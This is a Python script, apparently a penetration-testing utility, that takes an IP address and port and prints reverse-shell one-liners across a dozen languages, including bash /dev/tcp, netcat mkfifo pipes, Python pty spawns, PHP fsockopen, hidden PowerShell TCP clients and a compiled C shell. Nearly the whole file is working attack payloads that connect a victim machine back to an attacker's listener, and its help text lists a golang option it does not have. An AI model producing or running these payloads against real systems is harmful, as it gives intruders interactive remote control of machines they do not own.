import argparse
parser = argparse.ArgumentParser( description= " Generate shells in common programming luanguage to get r3v3rs3 sh3ll ")
parser.add_argument('-p' , '--port' , metavar='', help=' Port no on which u want to get reverse shell ')
parser.add_argument('-ip' , metavar='', help=' Ip address on which u want to get reverse shell ')
parser.add_argument('-s' ,'--shell' , metavar='', help='   type of Shell language you want ')
parser.add_argument('-o','--option', metavar='', help=' shell language available', nargs="?", const="default")
args=parser.parse_args()
def padding():
	print("\033[00m ")
	print("[*]\033[1;32m")
def call_shell(option):
	if option == "bash" or option == "sh" or option =="1":
		print(" ")
		print("\033[1;34m[#] Bash TCP")
		padding()
		print("bash -i >& /dev/tcp/{0}/{1} 0>&1".format(args.ip,args.port))
		padding()
		print("0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196".format(args.ip,args.port))
		padding()
		print("/bin/bash -l > /dev/tcp/{0}/{1} 0<&1 2>&1".format(args.ip,args.port))
		print(" \033[00m")
		print("\033[1;34m[#] Bash UDP")
		padding()
		print("Victim:\nsh -i >& /dev/udp/{0}/{1} 0>&1\nListener:\nnc -u -lvp {1}".format(args.ip,args.port))
	elif option == "perl" or option == "pl" or option =="2":
		print(" ")
		print("\033[1;34m[#] Linux")
		padding()
		print("perl -e 'use Socket;$i=","{0};$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname".format(args.ip,args.port),'("tcp"))',';if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,','">&S");','open(STDOUT,">&S")',';open(STDERR,">&S")',';exec("/bin/sh -i")',";};'",sep="")
		padding()
		print("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,","{0}:{1}".format(args.ip,args.port),");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",sep="")
		print(" ")
		print("\033[1;34m[#] Windows")
		padding()
		print("perl -MIO -e ",'$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'.format(args.ip,args.port),sep="")
	elif option == "python" or option == "py" or option =="3":
		print(" ")
		print("[#] Linux")
		print(" ")
		print("\033[1;34mIPv4")
		padding()
		print('export RHOST="{0}";export RPORT={1};python -c '.format(args.ip,args.port), 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")',sep="")
		padding()
		print("python -c ",'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(args.ip,args.port),sep="")
		padding()
		print("python -c ",'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'.format(args.ip,args.port),sep="")
		padding()
		print("python -c ",'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'.format(args.ip,args.port),sep="")
		print(" ")
		print("\033[1;34mIPv4 (No Spaces)")
		padding()
		print("python -c ",'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(args.ip,args.port),sep="")
		padding()
		print("python -c ",'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'.format(args.ip,args.port),sep="")
		padding()
		print("python -c ",'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'.format(args.ip,args.port),sep="")
		print(" ")
		print("\033[1;34mIPv4 (No Spaces, Shortened)")
		padding()
		print("python -c", 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("{0}",{1}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'.format(args.ip,args.port),sep="")
		padding()
		print("python -c",'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("{0}",{1}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'.format(args.ip,args.port),sep="")
		padding()
		print("python -c",'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("{0}",{1}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'.format(args.ip,args.port),sep="")
	elif option == "php" or option =="4":
		padding()
		print("php -r"," '$sock=fsockopen",'("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3"'.format(args.ip,args.port),");'",sep="")
		padding()
		print("<?php shell_exec",'("/bin/bash -c', "' bash -i > /dev/tcp/{0}/{1} 0>&1'".format(args.ip,args.port),'"); ?>',sep="")
		padding()
		print("php -r"," '$sock=fsockopen",'("{0}",{1});shell_exec("/bin/sh -i <&3 >&3 2>&3"'.format(args.ip,args.port),");'",sep="")
		padding()
		print("php -r"," '$sock=fsockopen",'("{0}",{1});`/bin/sh -i <&3 >&3 2>&3`'.format(args.ip,args.port),";'",sep="")
		padding()
		print("php -r"," '$sock=fsockopen",'("{0}",{1});system("/bin/sh -i <&3 >&3 2>&3"'.format(args.ip,args.port),");'",sep="")
		padding()
		print("php -r"," '$sock=fsockopen",'("{0}",{1});passthru("/bin/sh -i <&3 >&3 2>&3")'.format(args.ip,args.port),";'",sep="")
		padding()
		print("php -r"," '$sock=fsockopen",'("{0}",{1});popen("/bin/sh -i <&3 >&3 2>&3", "r"'.format(args.ip,args.port),");'",sep="")
		padding()
		print("php -r"," '$sock=fsockopen",'("{0}",{1});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes)'.format(args.ip,args.port),";'",sep="")
	elif option == "ruby" or option =="5" or option=="rb":
		print(" ")
		print("\033[1;34m[#] Linux")
		padding()
		print("ruby -rsocket -e","'f=TCPSocket.open",'("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d"'.format(args.ip,args.port),",f,f,f)'",sep="")
		padding()
		print("ruby -rsocket -e","'exit if fork;c=TCPSocket.new",'("{0}","{1}")'.format(args.ip,args.port),';loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"',"}'",sep="")
		print(" ")
		print("\033[1;34m[#] Windows")
		padding()
		print("ruby -rsocket -e"," 'c=TCPSocket.new",'("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r")'.format(args.ip,args.port),"{|io|c.print io.read}end'",sep="")
	elif option == "netcat" or option == "6" or option == "nc":
		padding()
		print("nc -e /bin/sh {0} {1}".format(args.ip,args.port))
		padding()
		print("nc -e /bin/bash {0} {1}".format(args.ip,args.port))
		padding()
		print("nc -c bash {0} {1}".format(args.ip,args.port))
		padding()
		print("mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc {0} {1} 1>/tmp/backpipe".format(args.ip,args.port))
		padding()
		print("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f".format(args.ip,args.port))
		padding()
		print("rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f".format(args.ip,args.port))
		padding()
		print("ncat {0} {1} -e /bin/bash".format(args.ip,args.port))
		padding()
		print("ncat --udp {0} {1} -e /bin/bash".format(args.ip,args.port))
	elif option == "java" or option == "7":
		padding()
		print("Runtime r = Runtime.getRuntime();")
		print("Process p = r.exec",'("/bin/bash -c'," 'exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done'".format(args.ip,args.port),'");',sep="")
		print("p.waitFor();")
		padding()
		print('String host="{0}";'.format(args.ip),"\nint port={0};".format(args.port),'\nString cmd="cmd.exe";')
		print("Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();")
	elif option == "powershell" or option == "8" :
		padding()
		print('powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|'.format(args.ip,args.port),'%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',sep="")
		padding()
		print("powershell -nop -c",' "$client = New-Object System.Net.Sockets.TCPClient',"('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|".format(args.ip,args.port),'%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback'," + 'PS ' + (pwd).Path + '> ';$sendbyte",' = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',sep="")
	elif option == "telnet" or option == "9":
		padding()
		port1=int(args.port) + 1
		print("In Attacker machine start two listeners:")
		print("nc -lvp {0}".format(args.port))
		print("nc -lvp {0}".format(port1))
		print("In Victime machine run below command:")
		print("telnet {0} {1} | /bin/sh | telnet {0} {2}".format(args.ip,args.port,port1))
	elif option == "lua" or option == "10":
		print(" ")
		print("\033[1;34m[#] Linux")
		padding()
		print("lua -e",' "require',"('socket');require('os');t=socket.tcp();t:connect('{0}','{1}');os.execute('/bin/sh -i <&3 >&3 2>&3'".format(args.ip,args.port),');"',sep="")
		print(" ")
		print("\033[1;34m[#] Windows and Linux")
		padding()
		print("lua5.1 -e"," 'local host, port =",' "{0}", {1} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end'.format(args.ip,args.port)," end tcp:close()'",sep="")
	elif option == "C" or option == "11":
		padding()
		print("#include <stdio.h>","\n#include <sys/socket.h>","\n#include <sys/types.h>","\n#include <stdlib.h>","\n#include <unistd.h>","\n#include <netinet/in.h>","\n#include <arpa/inet.h>")
		print("int main(void)","\n{")
		print("int port = {0};".format(args.port))
		print("struct sockaddr_in revsockaddr;","\nint sockt = socket(AF_INET, SOCK_STREAM, 0);","\nrevsockaddr.sin_family = AF_INET;","\nrevsockaddr.sin_port = htons(port);")
		print('revsockaddr.sin_addr.s_addr = inet_addr("{0}");'.format(args.ip))
		print("connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));","\ndup2(sockt, 0);","\ndup2(sockt, 1);","\ndup2(sockt, 2);")
		print('char * const argv[] = {"/bin/sh", NULL};','\nexecve("/bin/sh", argv, NULL);',"\nreturn 0;","\n}")
	elif option == "awk" or option =="12":
		padding()
		print("awk"," 'BEGIN {s =",' "/inet/tcp/0/{0}/{1}"'.format(args.ip,args.port),'; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}',"' /dev/null",sep="")
	else:
		print(" ")
		print("\033[1;31m[X] Oh sorry! This Luanguage not available right now\033[00m")
def call_shell_option(flag=False):
	if flag is True:
		print("\n")
		print("Shell Option:")
		print("[bash, sh] [perl, pl] [python, py] [php] [ruby, rb] [netcat, nc] [java] [golang go] [telnet] [C] [awk]")
	else:
		print("\n")
		print("\033[1;33mShell Options:\033[00m")
		print("\033[1;33m1. bash\n2. perl\n3. python\n4. php\n5. ruby\n6. netcat\n7. java\n8. powershell\n9. telnet\n10. lua\n11. C\n12. awk\033[00m")
		print("\n")
		options=input("\033[1;33mEnter your Choice: \033[00m")
		call_shell(options)
def call_help():
	parser.print_help()
	print("\n")
	print("Usage:")
	print("python3 shellgen.py -p [listen port] -ip [listen ip] \npython3 shellgen.py -p [listen port] -ip [listen ip] -s/--shell [shell type] ")
	print("\n")
	print("Example:")
	print("python3 shellgen.py -p/--port 4444 -ip 10.10.10.11 -s/--shell bash \npython3 shellgen.py -p/--port 4444 -ip 10.10.10.11")
	call_shell_option(True) 
def call_option():
	print(" ")
	print("[*]")
	print("\033[1;34mShell Options:\033[00m")
	print("\033[1;34m1. bash\n2. perl\n3. python\n4. php\n5. ruby\n6. netcat\n7. java\n8. powershell\n9. telnet\n10. lua\n11. C\n12. awk\033[00m")
if __name__ == "__main__":
	if args.shell is None and  args.ip is None and args.shell is None and args.option is not None:
		call_option()
	elif args.port is not None and args.ip is not None and args.shell is not None:
		call_shell(args.shell)
	elif args.shell is None and args.port is not None and args.ip is not None:
		call_shell_option()
	else:
		call_help()
